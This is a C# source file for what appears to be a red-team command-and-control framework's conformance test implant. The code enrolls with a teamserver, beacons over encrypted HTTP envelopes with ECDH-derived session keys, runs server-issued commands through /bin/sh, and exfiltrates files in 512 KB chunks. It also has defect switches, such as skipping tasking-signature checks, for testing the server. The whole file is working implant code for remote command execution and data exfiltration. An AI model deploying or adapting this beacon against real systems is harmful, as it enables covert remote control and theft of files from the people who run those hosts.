using System.Net.Http.Json;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Rod.CoreState;
using Rod.Transport.Endpoints;
using Rod.Transport.Payloads;
using Rod.V1;

namespace Rod.Conformance;

/// <summary>
/// The minimal implant's wire behavior: enroll the generated key, then the
/// envelope POST cycle until stopped -- the poll discipline the contract
/// sets, with the tasking-signature gate, shell.exec execution, and chunked
/// file.pull exfil inline. One instance is one candidate run: the
/// in-process <see cref="MinimalImplant"/> starts one per phase, and the
/// example implant binary runs it once from the environment until killed.
/// A past kill date returns before any contact -- the refusal the kill-date
/// clause observes.
///
/// When the target carries an envelope key the loop runs the sealed
/// posture with the session-key arm (architecture.md Sec 9): the enroll
/// body seals under the baked key, the first contact offers an ephemeral
/// P-256 public on its handshake and carries nothing else, and every body
/// after the agreement seals under the HKDF-derived session keys -- the
/// same arm the reference implants run. Without one it keeps the plaintext
/// lab posture the Tier 0 clauses were built on.
/// </summary>
public sealed class MinimalImplantLoop(ImplantDefects defects)
{
    private readonly ImplantDefects _defects = defects;
    private readonly HttpClient _http = new();

    // The replay-nonce state (architecture.md Sec 9), the reference posture:
    // advertise at every handshake, honor the echo, and keep the accepted
    // nonce floor across cycles -- the server's counter is per-implant.
    private readonly TaskNonceFloor _nonces = new();
    private bool _negotiated;

    // The sealed posture's state: the baked seal the target named, the
    // session keys once a handshake agreed them, and the contact counter
    // the sealed body covers. Null baked keeps the plaintext lab posture.
    private (Guid KeyId, byte[] Key)? _baked;
    private (Guid SessionId, byte[] RequestKey, byte[] ResponseKey)? _session;
    private long _counter;

    public async Task RunAsync(ConformanceTarget target, CancellationToken cancellationToken)
    {
        // Tier 1: refuse to start past the baked kill date.
        if (target.KillDate is { } killDate && killDate < DateTimeOffset.UtcNow)
            return;

        _baked = target.EnvelopeKey is { } baked
            && AesGcmEnvelope.TryUnbake(baked, out var bakedKeyId, out var bakedKey)
            ? (bakedKeyId, bakedKey)
            : null;

        // Tier 0, half one: generate the keypair, enroll the public half.
        // The keyed posture seals the enroll body under the baked key (the
        // JSON body wrapped in the R1 envelope, a JSON string of its base64).
        using var key = ECDsa.Create(ECCurve.NamedCurves.nistP256);
        var enrollJson = System.Text.Json.JsonSerializer.Serialize(new
        {
            deployTokenSecret = target.DeployToken,
            publicKey = Convert.ToBase64String(key.ExportSubjectPublicKeyInfo()),
        });
        HttpContent body = _baked is { } seal
            ? new StringContent(
                System.Text.Json.JsonSerializer.Serialize(
                    AesGcmEnvelope.Wrap(
                        System.Text.Encoding.UTF8.GetBytes(enrollJson), seal.KeyId, seal.Key, AesGcmEnvelope.Aad)),
                System.Text.Encoding.UTF8,
                "application/json")
            : new StringContent(enrollJson, System.Text.Encoding.UTF8, "application/json");
        using var response = await _http.PostAsync(target.EnrollUrl, body, cancellationToken);
        response.EnsureSuccessStatusCode();
        using var document = await System.Text.Json.JsonDocument.ParseAsync(
            await response.Content.ReadAsStreamAsync(cancellationToken), cancellationToken: cancellationToken);
        var root = document.RootElement;
        var implantId = root.GetProperty("implantId").GetString()!;
        var cas = root.GetProperty("caChain").EnumerateArray()
            .Select(b64 => X509CertificateLoader.LoadCertificate(Convert.FromBase64String(b64.GetString()!)))
            .ToArray();

        // Tier 0, half two: the envelope POST cycle until stopped. The
        // response's tasking executes after the cycle; its results and chunks
        // ride the next cycle's request.
        var pending = new List<Frame>();
        while (!cancellationToken.IsCancellationRequested)
        {
            try
            {
                pending = await ContactOnceAsync(target, implantId, cas, pending, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return;
            }
            catch (Exception)
            {
                // A failed contact is a dropped cycle for a poll loop.
            }
            await Task.Delay(TimeSpan.FromSeconds(1), cancellationToken);
        }
    }

    private async Task<List<Frame>> ContactOnceAsync(
        ConformanceTarget target,
        string implantId,
        X509Certificate2[] cas,
        List<Frame> pending,
        CancellationToken cancellationToken)
    {
        var outbound = new List<Frame>();

        // The keyed posture's agreement contact: the offer rides the
        // handshake and nothing else does, so the pending frames wait for
        // the session it opens.
        var agreeing = _baked is not null && _session is null;
        byte[]? offered = null;
        ECDiffieHellman? ephemeral = null;
        if (agreeing)
        {
            ephemeral = ECDiffieHellman.Create(ECCurve.NamedCurves.nistP256);
            offered = ExportPoint(ephemeral);
        }

        // The defect variant speaks its result frame first; the server answers
        // an unspecified handshake status and closes, which is the point.
        if (_defects.SpeakHandshakeSecond)
        {
            outbound.Add(new Frame
            {
                Kind = FrameKind.TaskResult,
                Payload = ByteString.CopyFrom(new TaskResult().ToByteArray()),
            });
        }

        var handshake = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = implantId,
            Capabilities = { "shell.exec", "file.pull" },
            ReplayNonces = true,
        };
        if (offered is not null)
            handshake.SessionPublic = ByteString.CopyFrom(offered);
        outbound.Add(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });
        if (!agreeing)
            outbound.AddRange(pending);

        // The body: the session's R2 shape once keys are held, the baked
        // key's R1 while agreeing, the plaintext frames in the lab posture.
        // Every sealed body covers a fresh counter ahead of the frames.
        var frames = Encode(outbound);
        HttpContent content;
        if (_session is { } session)
        {
            _counter++;
            var plain = new byte[8 + frames.Length];
            System.Buffers.Binary.BinaryPrimitives.WriteInt64BigEndian(plain, _counter);
            frames.CopyTo(plain, 8);
            content = new StringContent(
                AesGcmEnvelope.WrapSession(plain, session.SessionId, session.RequestKey, AesGcmEnvelope.ContactRequestAad),
                System.Text.Encoding.UTF8,
                "text/plain");
        }
        else if (_baked is { } seal)
        {
            _counter++;
            var plain = new byte[8 + frames.Length];
            System.Buffers.Binary.BinaryPrimitives.WriteInt64BigEndian(plain, _counter);
            frames.CopyTo(plain, 8);
            content = new StringContent(
                AesGcmEnvelope.Wrap(plain, seal.KeyId, seal.Key, AesGcmEnvelope.ContactRequestAad),
                System.Text.Encoding.UTF8,
                "text/plain");
        }
        else
        {
            content = new ByteArrayContent(frames);
        }

        using var sent = await _http.PostAsync(target.BeaconUrl, content, cancellationToken);

        // A refused session body is the fallback signal: the keys it held no
        // longer name a live agreement (a restarted teamserver), so the next
        // cycle offers a fresh agreement under the baked key.
        if ((int)sent.StatusCode == 401 && _session is not null)
        {
            _session = null;
            ephemeral?.Dispose();
            return pending;
        }
        sent.EnsureSuccessStatusCode();

        var responseBytes = await sent.Content.ReadAsByteArrayAsync(cancellationToken);
        var responseText = System.Text.Encoding.UTF8.GetString(responseBytes).Trim();
        byte[] plainBody;
        if (_session is { } opened)
            plainBody = AesGcmEnvelope.TryUnwrapSession(
                responseText, opened.SessionId, opened.ResponseKey, AesGcmEnvelope.ContactResponseAad)
                ?? throw new InvalidOperationException("The contact response did not open under the session key.");
        else if (_baked is { } seal)
            plainBody = AesGcmEnvelope.TryUnwrap(
                responseText, seal.KeyId, seal.Key, AesGcmEnvelope.ContactResponseAad)
                ?? throw new InvalidOperationException("The contact response did not open under the baked key.");
        else
            plainBody = responseBytes;

        var inbound = Parse(plainBody);
        if (inbound.Count == 0)
        {
            ephemeral?.Dispose();
            return pending;
        }
        var handshakeAnswer = HandshakeResponse.Parser.ParseFrom(inbound[0].Payload);
        if (handshakeAnswer.Status != HandshakeStatus.Ok)
        {
            ephemeral?.Dispose();
            return new List<Frame>(); // Every non-OK status is permanent: stop contacting.
        }
        _negotiated = handshakeAnswer.ReplayNonces;

        // The agreement's answer: derive the session keys from the echoed
        // ephemeral and the baked key, and every body after this one runs
        // under them. No echo keeps the baked-key seal (the negotiated-arm
        // fallback an unupgraded server answers with).
        if (agreeing && handshakeAnswer.SessionPublic.Length == SessionSealKeys.PublicKeyBytes)
        {
            using var server = ECDiffieHellman.Create();
            var serverPoint = handshakeAnswer.SessionPublic.ToByteArray();
            server.ImportParameters(new ECParameters
            {
                Curve = ECCurve.NamedCurves.nistP256,
                Q = new ECPoint
                {
                    X = serverPoint.AsSpan(1, 32).ToArray(),
                    Y = serverPoint.AsSpan(33, 32).ToArray(),
                },
            });
            var shared = ephemeral!.DeriveRawSecretAgreement(server.PublicKey);
            var seal = _baked!.Value;
            var okm = SessionSealKeys.Derive(shared, seal.Key, seal.KeyId, new ImplantId(Guid.Parse(implantId)));
            _session = (new Guid(okm.AsSpan(0, 16)), okm[16..48], okm[48..80]);
        }
        ephemeral?.Dispose();

        if (agreeing)
            return pending;

        var next = new List<Frame>();
        foreach (var frame in inbound.Skip(1))
        {
            if (frame.Kind == FrameKind.ChannelInput)
                continue; // No channel verb advertised: input never routes here.
            var request = TaskRequest.Parser.ParseFrom(frame.Payload);

            var outcome = Rod.V1.TaskOutcome.Failed;
            var output = "rejected";
            if (_defects.SkipSignatureVerification || VerifyTasking(cas, implantId, request))
            {
                if (request.Verb == "shell.exec")
                {
                    (outcome, output) = RunShell(request.Arguments);
                }
                else if (request.Verb == "file.pull")
                {
                    (outcome, output) = FilePull(next, request);
                }
                else
                {
                    output = "unknown verb";
                }
            }
            else if (request.HasTaskNonce && _nonces.IsReplay(request.TaskNonce))
            {
                output = $"task rejected: replayed tasking (nonce {request.TaskNonce}); not executed";
            }

            next.Add(new Frame
            {
                Kind = FrameKind.TaskResult,
                Payload = ByteString.CopyFrom(new TaskResult
                {
                    TaskId = request.TaskId,
                    Outcome = outcome,
                    Output = output,
                }.ToByteArray()),
            });
        }
        return next;
    }

    // The uncompressed SEC1 point the session-key arm offers: 0x04 || X || Y,
    // the export's coordinates right-aligned to the field size.
    private static byte[] ExportPoint(ECDiffieHellman keys)
    {
        var point = keys.ExportParameters(includePrivateParameters: false).Q;
        var encoded = new byte[SessionSealKeys.PublicKeyBytes];
        encoded[0] = 0x04;
        LeftAligned(point.X, encoded.AsSpan(1, 32));
        LeftAligned(point.Y, encoded.AsSpan(33, 32));
        return encoded;
    }

    private static void LeftAligned(byte[]? coordinate, Span<byte> slot)
    {
        if (coordinate is not { Length: > 0 })
            return;
        var source = coordinate.AsSpan(Math.Max(0, coordinate.Length - slot.Length));
        source.CopyTo(slot.Slice(slot.Length - source.Length));
    }

    private static (Rod.V1.TaskOutcome Outcome, string Output) RunShell(string arguments)
    {
        var psi = new System.Diagnostics.ProcessStartInfo
        {
            FileName = "/bin/sh",
            Arguments = "-c \"" + arguments.Replace("\"", "\\\"") + "\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
        };
        using var process = System.Diagnostics.Process.Start(psi)!;
        var output = process.StandardOutput.ReadToEnd();
        process.WaitForExit(15000);
        return process.ExitCode == 0
            ? (Rod.V1.TaskOutcome.Succeeded, output)
            : (Rod.V1.TaskOutcome.Failed, output);
    }

    private (Rod.V1.TaskOutcome Outcome, string Output) FilePull(List<Frame> next, TaskRequest request)
    {
        var path = request.Arguments.Split(' ')[0];
        if (!File.Exists(path))
            return (Rod.V1.TaskOutcome.Failed, "no such file");

        var content = File.ReadAllBytes(path);
        const int chunkSize = 512 * 1024;
        var order = Enumerable.Range(0, (content.Length + chunkSize - 1) / chunkSize).ToList();
        if (_defects.ScrambleChunkSequences && order.Count > 1)
            order.Reverse(); // The defect: terminal-first, reversed sequences.

        foreach (var index in order)
        {
            var offset = index * chunkSize;
            var end = Math.Min(offset + chunkSize, content.Length);
            var slice = new byte[end - offset];
            Array.Copy(content, offset, slice, 0, slice.Length);
            next.Add(new Frame
            {
                Kind = FrameKind.ExfilChunk,
                Payload = ByteString.CopyFrom(new ExfilChunk
                {
                    TaskId = request.TaskId,
                    Name = Path.GetFileName(path),
                    ContentType = "application/octet-stream",
                    Sequence = (ulong)index,
                    Terminal = index == order.Count - 1,
                    Data = ByteString.CopyFrom(slice),
                }.ToByteArray()),
            });
        }
        return (Rod.V1.TaskOutcome.Succeeded, path);
    }

    /// <summary>
    /// Tier 1 tasking verification per the contract doc: RSASSA-PSS over
    /// SHA-256 on the canonical length-prefixed tuple -- the own implant_id,
    /// task_id, verb, arguments, and the nonce when the task carries one --
    /// followed by the replay-nonce floor: a nonce at or below the accepted
    /// floor is a replayed frame, and nonce-less tasking is refused once the
    /// arm was negotiated.
    /// </summary>
    private bool VerifyTasking(
        X509Certificate2[] cas,
        string implantId,
        TaskRequest request)
    {
        if (request.Signature.Length == 0)
            return false;

        using var canonical = new MemoryStream();
        var fields = request.HasTaskNonce
            ? new[] { implantId, request.TaskId, request.Verb, request.Arguments, request.TaskNonce.ToString() }
            : new[] { implantId, request.TaskId, request.Verb, request.Arguments };
        foreach (var value in fields)
        {
            var bytes = System.Text.Encoding.UTF8.GetBytes(value);
            canonical.Write(BitConverter.GetBytes((uint)bytes.Length), 0, 4);
            canonical.Write(bytes, 0, bytes.Length);
        }
        var signed = canonical.ToArray();

        foreach (var ca in cas)
        {
            using var rsa = ca.GetRSAPublicKey();
            if (rsa is null)
                continue;
            if (!rsa.VerifyData(signed, request.Signature.ToByteArray(),
                    HashAlgorithmName.SHA256, RSASignaturePadding.Pss))
                continue;

            if (request.HasTaskNonce)
            {
                if (_nonces.IsReplay(request.TaskNonce))
                    return false;
                _nonces.Observed(request.TaskNonce);
                return true;
            }
            return !_negotiated;
        }
        return false;
    }

    /// <summary>
    /// The accepted-nonce floor: monotonic across the candidate's whole run,
    /// so a replayed frame is refused regardless of which cycle delivered it.
    /// </summary>
    private sealed class TaskNonceFloor
    {
        private ulong _highest;

        public bool IsReplay(ulong nonce) => nonce <= _highest;

        public void Observed(ulong nonce)
        {
            if (nonce > _highest)
                _highest = nonce;
        }
    }

    // The envelope codec: the protobuf canonical delimited-stream shape --
    // an unsigned varint length before each marshaled Frame.

    private static byte[] Encode(IReadOnlyList<Frame> frames)
    {
        var body = new MemoryStream();
        foreach (var frame in frames)
        {
            var marshaled = frame.ToByteArray();
            WriteVarint(body, marshaled.Length);
            body.Write(marshaled);
        }
        return body.ToArray();
    }

    private static List<Frame> Parse(byte[] body)
    {
        var frames = new List<Frame>();
        var position = 0;
        while (position < body.Length)
        {
            uint length = 0;
            var shift = 0;
            int delimiter;
            for (delimiter = 0; delimiter < 5; delimiter++)
            {
                var b = body[position + delimiter];
                length |= (uint)(b & 0x7f) << shift;
                if ((b & 0x80) == 0)
                    break;
                shift += 7;
            }
            position += delimiter + 1;
            frames.Add(Frame.Parser.ParseFrom(body, position, (int)length));
            position += (int)length;
        }
        return frames;
    }

    private static void WriteVarint(MemoryStream target, int value)
    {
        uint remaining = (uint)value;
        while (remaining >= 0x80)
        {
            target.WriteByte((byte)(remaining | 0x80));
            remaining >>= 7;
        }
        target.WriteByte((byte)remaining);
    }
}
